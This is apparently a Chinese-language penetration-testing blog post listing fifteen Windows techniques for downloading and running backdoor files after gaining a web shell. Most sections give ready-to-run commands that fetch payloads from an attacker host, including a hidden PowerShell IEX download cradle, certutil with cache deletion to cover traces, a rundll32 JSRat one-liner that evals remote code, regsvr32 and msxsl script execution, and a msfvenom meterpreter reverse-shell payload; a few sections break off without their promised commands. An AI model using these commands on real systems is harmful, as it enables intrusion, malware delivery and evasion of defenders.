当我们通过 Web 渗透获取了一个 Shell，而且目标主机是 Windows，我们该怎么去下载后门文件到目标主机上执行呢？

一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；**第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式****。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。

**在这里，****本文收集了 15 种常见的文件下载执行的方式，并结合具体案例**，让我们一起来看看是怎么实现的吧。

*   PowerShell
    
*   Bitsadmin
    
*   certutil
    
*   wget
    
*   ipc$ 文件共享
    
*   FTP
    
*   TFTP
    
*   WinScp
    
*   msiexec
    
*   IEExec
    
*   mshta
    
*   rundll32
    
*   regsvr32
    
*   MSXSL.EXE
    
*   pubprn.vbs
    
* * *

**1、PowerShell**

PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。

远程下载文件保存在本地：

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')
```

远程执行命令：

```
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
```

**2、Bitsadmin**

bitsadmin 是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。

```
bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
```

输入以上命令，成功下载文件。

**3、certutil**

用于备份证书服务，支持 xp-win10 都支持。由于 certutil 下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。

注：缓存目录为：

```
”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”
```

```
#下载文件
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
#删除缓存
certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
```

**4、wget**  

Windows 环境下，可上传免安装的可执行程序 wget.exe 到目标机器，使用 wget 下载文件。

wget.exe 下载：https://eternallybored.org/misc/wget/

```
wget -O "evil.txt" http://192.168.28.128/imag/evil.txt
```

**5、ipc$ 文件共享**

IPC$(Internet Process Connection) 是共享” 命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

**6、FTP**

一般情况下攻击者使用 FTP 上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

**7、TFTP**

用来下载远程文件的最简单的网络协议，它基于 UDP 协议而实现

tftp32 服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html

```
tftp -i 你的IP get 要下载文件 存放位置
```

**8、WinScp**

WinSCP 是一个 Windows 环境下使用 SSH 的开源图形化 SFTP 客户端。

使用 winscp.exe 作为命令行参数执行远程上传 / 下载操作。

**9、msiexec**

msiexec 支持远程下载功能，将 msi 文件上传到服务器，通过如下命令远程执行：

**10、IEExec**

IEexec.exe 应用程序是. NET Framework 附带程序，存在于多个系统白名单内。

生成 Payload：

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
```

使用管理员身份打开 cmd，分别运行下面两条命令。

**11、mshta**

mshta 用于执行. hta 文件，而 hta 是 HTML Applocation 的缩写，也就是 HTML 应用程序。而 hta 中也支持 VBS。所以我们可以利用 hta 来下载文件。

```
mshta http://192.168.28.128/run.hta
```

run.hta 内容如下：

**12、rundll32**

其实还是依赖于 WScript.shell 这个组件，在这里我们使用 JSRat 来做演示，JSRat 是一个命令和控制框架，仅为 rundll32.exe 和 regsvr32.exe 生成恶意程序。

项目地址：

```
https://github.com/Hood3dRob1n/JSRat-Py.git
```

步骤一：开始运行 JSRat，监听本地 8888 端口。

步骤二：通过 url 访问，可以查看恶意代码。

复制代码如下：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

步骤三：在受害者 PC 运行该代码，将成功返回一个会话

**13、regsvr32**

Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行

在目标机上执行：

```
regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
```

可以通过自己构造. sct 文件，去下载执行我们的程序

执行命令，成功弹计算器：

**14、MSXSL.EXE**

msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过他，我们可以执行 JavaScript 进而执行系统命令。

下载地址为：

```
https://www.microsoft.com/en-us/download/details.aspx?id=21714
```

msxsl.exe 需要接受两个文件，XML 及 XSL 文件，可以远程加载，具体方式如下：

```
msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
```

demo.xml

exec.xsl

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
   return nodelist.nextNode().xml;
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

**15、pubprn.vbs**

在 Windows 7 以上版本存在一个名为 PubPrn.vbs 的微软已签名 WSH 脚本，其位于 C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给 GetObject()

```
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

test.sct
